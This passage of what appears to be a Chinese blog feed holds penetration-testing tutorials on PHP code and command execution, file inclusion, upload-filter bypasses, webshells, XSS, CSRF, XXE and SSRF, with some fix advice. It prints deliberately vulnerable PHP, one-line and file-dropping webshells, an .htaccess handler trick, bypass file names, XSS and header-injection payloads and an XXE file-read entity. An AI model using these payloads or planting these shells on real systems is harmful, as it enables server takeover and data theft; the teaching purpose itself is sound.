        <content type="html"><![CDATA[<h3 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h3><p>例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 定义一个数组</span><br><span class="line">$array = array(&apos;name&apos; =&gt; &apos;webing&apos;, &apos;site&apos; =&gt; &apos;https://webing.io&apos; , &apos;siteage&apos; =&gt; 1);</span><br><span class="line">// 将数组转换成字符串，就是序列化</span><br><span class="line">echo &quot;序列化：&lt;/br&gt;&quot;;</span><br><span class="line">echo serialize($array);</span><br><span class="line"></span><br><span class="line">// 把字符串转换成数组，就是反序列化</span><br><span class="line">echo &quot;&lt;/br&gt;&lt;/br&gt;反序列化：&lt;/br&gt;&quot;;</span><br><span class="line">echo unserialize(serialize($array));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="../do/images/pentest/pentest-serialization01.png" alt></p><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>PHP反序列化，围绕着serialize()，unserialize()这两个函数。序列化说通俗点就是把一个对象变成可以传输的字符串。比如json格式，就是一种序列化，有可能就是通过array序列化而来的。而反序列化就是把那串可以传输的字符串再变回对象。</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试-代码执行、命令执行</title>
      <link href="/article/pentest-code-command-execute.html"/>
      <url>/article/pentest-code-command-execute.html</url>
      
        <content type="html"><![CDATA[<h3 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h3><p>代码执行，就是用户通过浏览器提交执行代码，由于服务器端没有针对执行函数做过滤，导致执行一个恶意构造的代码，在这里代码执行调用的是语言本身的代码执行函数。</p><p>PHP测试代码，eval()为代码执行函数，当然不止这一个函数可以执行代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;Code Command Test!&lt;/br&gt;Code Command:&lt;/br&gt;&quot;;</span><br><span class="line">$id = $_GET[&apos;id&apos;];</span><br><span class="line">eval(&quot;echo $id;&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这里没有进行任何的过滤，直接执行传入的参数。<br><img src="../do/images/pentest/pentest-code-command01.gif" alt></p><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>命令执行，就是用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致执行一个恶意构造的命令，在这里命令执行调用的是语言本身的命令执行函数。</p><p>PHP测试代码，exec()为命令执行函数，当然不止这一个函数可以执行命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;Code Command Test!&lt;/br&gt;Code Command:&lt;/br&gt;&quot;;</span><br><span class="line">$id = $_GET[&apos;id&apos;];</span><br><span class="line">$cmd = exec(&quot;$id&quot;);</span><br><span class="line">var_dump($cmd);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这里没有进行任何的过滤，直接执行传入的参数。<br><img src="../do/images/pentest/pentest-code-command02.gif" alt></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试-文件包含、文件读取</title>
      <link href="/article/pentest-file-Include.html"/>
      <url>/article/pentest-file-Include.html</url>
      
        <content type="html"><![CDATA[<h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p>客户端进行提交，服务端进行包含解析，和CSRF类似。<br>如果包含的文件必须是jpg，可以尝试%00截断，比如爱立信现场综合管理系统的通用文件包含、文件读取，目前为止这个漏洞还没公布。<br><img src="../do/images/pentest/pentest-file-Inclusion01.gif" alt></p><p>远程文件包含，这两项开启才能进行利用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_include</span><br><span class="line">allow_url_fopen</span><br></pre></td></tr></table></figure><h3 id="PHP协议包含"><a href="#PHP协议包含" class="headerlink" title="PHP协议包含"></a>PHP协议包含</h3><p>接收内容后直接进行包含，链接中包含php://可以进行尝试。<br>如，直接提交PHP代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">phpinfo();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这两项开启才能进行利用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_include</span><br><span class="line">allow_url_fopen</span><br></pre></td></tr></table></figure><h3 id="data协议包含"><a href="#data协议包含" class="headerlink" title="data协议包含"></a>data协议包含</h3><p>这两项开启才能进行利用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_include</span><br><span class="line">allow_url_fopen</span><br></pre></td></tr></table></figure><p><img src="../do/images/pentest/pentest-file-Inclusion02.gif" alt></p><h3 id="PHP输入输出流"><a href="#PHP输入输出流" class="headerlink" title="PHP输入输出流"></a>PHP输入输出流</h3><p>这两项开启才能进行利用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_include</span><br><span class="line">allow_url_fopen</span><br></pre></td></tr></table></figure><p><img src="../do/images/pentest/pentest-file-Inclusion03.gif" alt></p><h3 id="日志文件包含"><a href="#日志文件包含" class="headerlink" title="日志文件包含"></a>日志文件包含</h3><p>代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;File Include Test!&quot;;</span><br><span class="line">$include = empty($_GET[&apos;i&apos;])? &quot;&quot; : $_GET[&apos;i&apos;];</span><br><span class="line">if ($include) &#123;</span><br><span class="line">    include_once $include;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="../do/images/pentest/pentest-file-Inclusion04.gif" alt></p><h3 id="修补"><a href="#修补" class="headerlink" title="修补"></a>修补</h3><ul><li>过滤/.符号</li><li>白名单验证（开启open_basedir函数），只包含指定目录下的文件</li><li>关闭文件包含的两个函数</li></ul><h3 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h3><ul><li>文件读取和文件包含差不多的</li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试-文件上传</title>
      <link href="/article/pentest-file-upload.html"/>
      <url>/article/pentest-file-upload.html</url>
      
        <content type="html"><![CDATA[<h3 id="文件上传漏洞概括"><a href="#文件上传漏洞概括" class="headerlink" title="文件上传漏洞概括"></a>文件上传漏洞概括</h3><p>1.可解析的后缀，也就是该语言有多个可解析的后缀，比如php语言可解析的后缀为php,php2,php3等等<br>2.大小写混合，如果系统过滤不严，可能大小写可以绕过。<br>3.中间件，每款中间件基本都解析漏洞,比如iis就可以把xxx.asp;.jpg当asp来执行。<br>4.系统特性，特别是Windows的后缀加点（.）,加空格，加::$DATA可以绕过目标系统。<br>5.语言漏洞，流行的三种脚本语言基本都存在00截断漏洞。<br>6.双后缀，这个与系统和中间件无关，偶尔会存在于代码逻辑之中。</p><h3 id="空字节"><a href="#空字节" class="headerlink" title="空字节"></a>空字节</h3><p>当字符串有%00(空字节)，就会被服务器认为是结束符号。<br><img src="../do/images/pentest/pentest-file-upload01.gif" alt></p><h3 id="文件上传的基本流程"><a href="#文件上传的基本流程" class="headerlink" title="文件上传的基本流程"></a>文件上传的基本流程</h3><ul><li>文件是否可以正常上传</li><li>文件上传是否完整（上传文件可能你会被截图、修改等，分两种：前端修改和服务端修改）</li><li>上传的域名是否是目标服务器，服务器是否解析(php asp aspx jsp cfm shtml等)</li></ul><h3 id="JS验证上传"><a href="#JS验证上传" class="headerlink" title="JS验证上传"></a>JS验证上传</h3><p>禁用JS、直接修改JS、抓包修改</p><h3 id="截断上传"><a href="#截断上传" class="headerlink" title="截断上传"></a>截断上传</h3><p>用到上边的空字节。<br><img src="../do/images/pentest/pentest-file-upload02.gif" alt><br><img src="../do/images/pentest/pentest-file-upload03.gif" alt></p><h3 id="黑白名单上传"><a href="#黑白名单上传" class="headerlink" title="黑白名单上传"></a>黑白名单上传</h3><p>白名单验证：<br>只能允许jpg、png上传</p><p>黑名单验证：<br>不能允许php、jsp上传<br>可以尝试php3、php4、php5、phtml，但是这种情况很少，我是没遇到过的。</p><h3 id="二次上传"><a href="#二次上传" class="headerlink" title="二次上传"></a>二次上传</h3><p>比如上传shell.jpg%00.php，服务器判断这个不是jpg文件，就把这个文件删掉。<br>再次上传的时候文件名就变成了shell.jpg(1)%00.php,然后判断这个不是jpg文件，就把这个上个文件名（shell.jpg%00.php）的文件删掉。</p><h3 id="mime类型上传"><a href="#mime类型上传" class="headerlink" title="mime类型上传"></a>mime类型上传</h3><p>常见的MIME类型(通用型)：</p><table><thead><tr><th align="center">文件后缀</th><th align="center">文件类型</th></tr></thead><tbody><tr><td align="center">超文本标记语言文本.html</td><td align="center">text/html</td></tr><tr><td align="center">xml文档.xml</td><td align="center">text/xml</td></tr><tr><td align="center">XHTML文档.xhtml</td><td align="center">application/xhtml+xml</td></tr><tr><td align="center">普通文本.txt</td><td align="center">text/plain</td></tr><tr><td align="center">RTF文本.rtf</td><td align="center">application/rtf</td></tr><tr><td align="center">PDF文档.pdf</td><td align="center">application/pdf</td></tr><tr><td align="center">Microsoft Word文件.word</td><td align="center">application/msword</td></tr><tr><td align="center">图片.jpg</td><td align="center">image/jpeg</td></tr></tbody></table><p><img src="../do/images/pentest/pentest-file-upload04.gif" alt></p><h3 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h3><p>流传已久的解析漏洞。</p><h4 id="IIS-5-x-6-0解析漏洞"><a href="#IIS-5-x-6-0解析漏洞" class="headerlink" title="IIS 5.x/6.0解析漏洞"></a>IIS 5.x/6.0解析漏洞</h4><p>IIS 6.0解析利用方法有两种</p><p>1.目录解析</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/xx.asp/xx.jpg</span><br></pre></td></tr></table></figure><p>2.文件解析</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell.asp;.jpg</span><br></pre></td></tr></table></figure><p>第一种，在网站下建立文件夹的名字为 .asp、.asa 的文件夹，其目录内的任何扩展名的文件都被IIS当作asp文件来解析并执行。</p><p>例如创建目录 shell.asp，那么</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/shell.asp/1.jpg</span><br></pre></td></tr></table></figure><p>将被当作asp文件来执行。假设黑阔可以控制上传文件夹路径,就可以不管你上传后你的图片改不改名都能拿shell了。</p><p>第二种，在IIS6.0下，分号后面的不被解析，也就是说</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell.asp;.jpg</span><br></pre></td></tr></table></figure><p>会被服务器看成是shell.asp</p><p>还有IIS6.0 默认的可执行文件除了asp还包含这三种</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/shell.asa</span><br><span class="line">/shell.cer</span><br><span class="line">/shell.cdx</span><br></pre></td></tr></table></figure><h4 id="IIS-7-0-IIS-7-5-Nginx-lt-8-03畸形解析漏洞"><a href="#IIS-7-0-IIS-7-5-Nginx-lt-8-03畸形解析漏洞" class="headerlink" title="IIS 7.0/IIS 7.5/ Nginx &lt;8.03畸形解析漏洞"></a>IIS 7.0/IIS 7.5/ Nginx &lt;8.03畸形解析漏洞</h4><p>在默认Fast-CGI开启状况下,黑阔上传一个名字为shell.jpg，内容为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?PHP fputs(fopen(&apos;shell.php&apos;,&apos;w&apos;),&apos;&lt;?php eval($_POST[cmd])?&gt;&apos;);?&gt;</span><br></pre></td></tr></table></figure><p>的文件，然后访问shell.jpg/.php,在这个目录下就会生成一句话木马 shell.php</p><h4 id="Nginx-lt-8-03-空字节代码执行漏洞"><a href="#Nginx-lt-8-03-空字节代码执行漏洞" class="headerlink" title="Nginx &lt;8.03 空字节代码执行漏洞"></a>Nginx &lt;8.03 空字节代码执行漏洞</h4><p>影响版:0.5.,0.6., 0.7 &lt;= 0.7.65, 0.8 &lt;= 0.8.37</p><p>Nginx在图片中嵌入PHP代码然后通过访问</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx.jpg%00.php</span><br></pre></td></tr></table></figure><p>来执行其中的代码</p><h4 id="Apache解析漏洞"><a href="#Apache解析漏洞" class="headerlink" title="Apache解析漏洞"></a>Apache解析漏洞</h4><p>Apache 是从右到左开始判断解析,如果为不可识别解析,就再往左判断.</p><p>比如 shell.php.owf.rar “.owf”和”.rar” 这两种后缀是apache不可识别解析,apache就会把shell.php.owf.rar解析成php.</p><p>如何判断是不是合法的后缀就是这个漏洞的利用关键,测试时可以尝试上传一个shell.php.rara.jpg.png…（把你知道的常见后缀都写上…）去测试是否是合法后缀</p><h4 id="net"><a href="#net" class="headerlink" title=".net"></a>.net</h4><p>上传Ashx文件，然后访问这个文件，就会在同目录下生成一个shell.aspx文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ WebHandler Language=&quot;C#&quot; Class=&quot;Handler&quot; %&gt;</span><br><span class="line">    using System;</span><br><span class="line">    using System.Web;</span><br><span class="line">    using System.IO;</span><br><span class="line">    public class Handler : IHttpHandler &#123;</span><br><span class="line">    public void ProcessRequest (HttpContext context) &#123;</span><br><span class="line">        context.Response.ContentType = &quot;text/plain&quot;;</span><br><span class="line">        StreamWriter file1= File.CreateText(context.Server.MapPath(&quot;shell.aspx&quot;));</span><br><span class="line">        file1.Write(&quot;&lt;%eval request(\&quot;shell\&quot;)%&gt;&quot;);</span><br><span class="line">        file1.Flush();</span><br><span class="line">        file1.Close();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    public bool IsReusable &#123;</span><br><span class="line">        get &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p>在windows环境下，xx.jpg[空格] 或xx.jpg. 这两类文件都是不允许存在的，若这样命名，windows会默认除去空格或点,黑客可以通过抓包，在文件名后加一个空格或者点绕过黑名单.若上传成功，空格和点都会被windows自动消除,这样也可以getshell。</p><p>如果在Apache中.htaccess可被执行.且可被上传.那可以尝试在.htaccess中写入: </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;shell.jpg&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>然后再上传shell.jpg的木马, 这样shell.jpg就可解析为php文件。</p><h3 id="双文件上传"><a href="#双文件上传" class="headerlink" title="双文件上传"></a>双文件上传</h3><p>服务器只验证了第一个文件的合法性，没有对第二个文件进行验证。</p><p><img src="../do/images/pentest/pentest-file-upload05.png" alt></p><h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><ul><li>白名单验证</li><li>升级最新版本PHP，防止空字节漏洞</li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试-webshell</title>
      <link href="/article/pentest-webshell.html"/>
      <url>/article/pentest-webshell.html</url>
      
        <content type="html"><![CDATA[<h3 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h3><p>webshell以网页文件的形式存在，利用语言代码执行的特性构建的一种命令执行环境，也可以将其称做为一种网页后门。<br>顾名思义，“web”的含义是显然需要服务器开放web服务，“shell”的含义是取得对服务器某种程度上操作权限。<br>webshell常常用于网站管理、服务器管理等等，根据FSO（文件系统对象）权限的不同，作用有在线编辑网页脚本、上传下载文件、查看数据库、执行任意程序命令等。</p><h3 id="代码执行函数"><a href="#代码执行函数" class="headerlink" title="代码执行函数"></a>代码执行函数</h3><p>PHP中可以执行代码的函数，常用于编写一句话木马，常见代码执行函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">eval()</span><br><span class="line">assert()</span><br><span class="line">preg_replace()</span><br><span class="line">create_function()</span><br><span class="line">array_map()</span><br><span class="line">call_user_func()</span><br><span class="line">call_user_func_array()</span><br><span class="line">array_filter</span><br><span class="line">usort</span><br><span class="line">uasort()</span><br></pre></td></tr></table></figure><h3 id="一句话"><a href="#一句话" class="headerlink" title="一句话"></a>一句话</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">eval($_GET[&apos;cmd&apos;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>通过传参执行系统命令。<br><img src="../do/images/pentest/pentest-webshell01.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">eval($_POST[&apos;cmd&apos;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>通过传参执行系统命令。<br><img src="../do/images/pentest/pentest-webshell02.png" alt><br><img src="../do/images/pentest/pentest-webshell03.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试-XSS CSLF CSRF XXE SSRF</title>
      <link href="/article/pentest-xss-cslf-csrf-xxe-ssrf.html"/>
      <url>/article/pentest-xss-cslf-csrf-xxe-ssrf.html</url>
      
        <content type="html"><![CDATA[<h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>XSS攻击全称跨站脚本攻击，是为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS，XSS是一种在web应用中的计算机安全漏洞，是由于web应用程序对用户的输入过滤不严而产生的。攻击者利用网站漏洞把恶意的脚本代码注入到网页中，当其他用户浏览这些网页时，就会执行其中的恶意代码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*/--&gt;&apos;&quot;&gt;&lt;/iframe&gt;&lt;/script&gt;&lt;/style&gt;&lt;/title&gt;&lt;/textarea&gt;&lt;script&gt;alert(/XSS/)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>存储XSS，会把攻击者提交JS攻击代码存储到数据库，攻击行为将伴随着攻击数据一直存在。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="../do/images/pentest/pentest-xss02.gif" alt></p><h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p>反射型XSS，也就是非持久型xss，攻击是一次性的，仅对当次的页面访问产生影响。非持久型xss攻击要求用户访问一个被攻击者篡改后的链接，用户访问该链接时，被植入的攻击脚本被用户游览器执行，从而达到攻击目的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/XSS/)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="../do/images/pentest/pentest-xss01.gif" alt></p><h3 id="DOM-XSS"><a href="#DOM-XSS" class="headerlink" title="DOM XSS"></a>DOM XSS</h3><p>不跟服务器通信,但是却能执行攻击者提交JS攻击代码,DOM—based XSS漏洞是基于文档对象模型Document Objeet Model的一种漏洞,dom - xss是通过url传入参数去控制触发的。</p><h3 id="CSLF"><a href="#CSLF" class="headerlink" title="CSLF"></a>CSLF</h3><p>默认情况下，浏览器都会设置XSS过滤，这种情况下，反射型XSS和DOM XSS就会被浏览器拦截。这时候可以使用CSLF来解决，也就是响应头注入。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">X-XSS-Protection: 0  告诉浏览器禁用XSS保护</span><br><span class="line">X-XSS-Protection: 1  告诉浏览器开启XSS保护</span><br></pre></td></tr></table></figure><p>这两个参数可以在返回的请求包中查看，看不到，说明是默认的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%0aX-XSS-Protection:%200&lt;script&gt;alert(/XSS/)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>这里%0a是换行，%20是空格</p><h3 id="修复XSS"><a href="#修复XSS" class="headerlink" title="修复XSS"></a>修复XSS</h3><ul><li><p>对用户输入的数据进行全面的检查过滤，特别是HTML特殊字符。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">| &amp; ; $ % @ &apos; &quot; \&apos; \&quot; &lt;&gt; () + CR LF , \</span><br></pre></td></tr></table></figure></li><li><p>转义</p></li></ul><h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><p>CSRF（Cross-site request forgery）跨站请求伪造，也被称为“One Click Attack”或者“Session Riding”。</p><p>CSRF利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。</p><p><img src="../do/images/pentest/pentest-csrf.gif" alt></p><h3 id="CSRF-修复"><a href="#CSRF-修复" class="headerlink" title="CSRF 修复"></a>CSRF 修复</h3><p>目前防御 CSRF 攻击主要有三种策略：</p><ul><li>验证HTTP Referer字段</li><li>在请求地址中添加 token 并验证</li><li>在HTTP头中自定义属性并验证</li></ul><h3 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h3><p>可以利用XXE漏洞做什么？</p><ul><li>任意文件读取</li><li>系统命令执行</li><li>内网主机及服务探测</li></ul><p>碰到这样的POST请求，可以尝试进行XML外部实体注入(XML External Entity Injection)，也就是XXE。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /xxe-2.php HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Content-Length: 59</span><br><span class="line">Origin: http://localhost</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.98 Safari/537.36 LBBROWSER</span><br><span class="line">Content-type: text/xml; charset=UTF-8</span><br><span class="line">Accept: */*</span><br><span class="line">Referer: http://localhost/xxe-1.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8</span><br><span class="line">Cookie: wp-settings-time-1=1539501633; PHPSESSID=u4ubvo8rcn2u156snucqdte5g1; security_level=2</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&lt;reset&gt;&lt;login&gt;bee&lt;/login&gt;&lt;secret&gt;Any bugs?&lt;/secret&gt;&lt;/reset&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;  &lt;!DOCTYPE Any [&lt;!ENTITY array SYSTEM &quot;file://///d:/test.txt&quot; &gt;]&gt;</span><br><span class="line">&lt;reset&gt;&lt;login&gt;&amp;array;&lt;/login&gt;&lt;secret&gt;Any bugs?&lt;/secret&gt;&lt;/reset&gt;</span><br></pre></td></tr></table></figure><p>读取文件：<br><img src="../do/images/pentest/pentest-xxe01.gif" alt></p><h3 id="修复XXE"><a href="#修复XXE" class="headerlink" title="修复XXE"></a>修复XXE</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">方案一、使用开发语言提供的禁用外部实体的方法</span><br><span class="line"></span><br><span class="line">PHP：</span><br><span class="line">libxml_disable_entity_loader(true);</span><br><span class="line"></span><br><span class="line">JAVA:</span><br><span class="line">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(false);</span><br><span class="line"></span><br><span class="line">Python：</span><br><span class="line">from lxml import etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</span><br><span class="line"> </span><br><span class="line">方案二、过滤用户提交的XML数据</span><br><span class="line"></span><br><span class="line">关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者，SYSTEM和PUBLIC。</span><br></pre></td></tr></table></figure><h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p><p>也就是说，服务器接收客户端的URL，然后服务器请求接收的URL，并返回请求的内容。</p><p>可以利用SSRF漏洞做什么？</p><ul><li>任意文件读取</li><li>系统命令执行</li><li>内网主机及服务探测</li></ul><p>和XXE漏洞差不多。<br><img src="../do/images/pentest/pentest-ssrf01.gif" alt></p><h3 id="SSRF修复"><a href="#SSRF修复" class="headerlink" title="SSRF修复"></a>SSRF修复</h3><p>网上的方法：</p><p>1,过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p><p>2,统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</p><p>3,限制请求的端口为http常用的端口，比如，80,443,8080,8090。</p><p>4,黑名单内网ip。避免应用被用来获取获取内网数据，攻击内网。</p><p>5,禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:///,gopher://,ftp:// 等引起的问题。</p><p>自己的方法：<br>直接把请求改成客户端请求呢，也就不用上边那么麻烦了。</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python Acunetix Web Vulnerability Scanner 11 批量扫描脚本[AWVS11批量扫描脚本]</title>
      <link href="/article/tool-awvs-scan.html"/>
      <url>/article/tool-awvs-scan.html</url>
      
